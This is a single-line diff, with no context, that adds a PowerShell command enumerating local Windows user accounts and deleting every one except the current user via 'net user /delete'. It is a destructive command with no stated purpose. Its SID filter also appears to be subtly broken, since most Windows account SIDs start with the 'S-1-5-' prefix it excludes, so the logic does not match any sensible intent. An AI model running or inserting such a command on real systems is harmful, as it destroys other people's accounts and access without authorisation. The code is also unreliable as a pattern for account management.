@@ -1,0 +1,1 @@
+Get-WmiObject Win32_UserAccount | Where-Object { $_.LocalAccount -eq $true -and $_.Name -ne $env:USERNAME -and -not $_.SID.StartsWith("S-1-5-") } | ForEach-Object { net user $_.Name /delete }
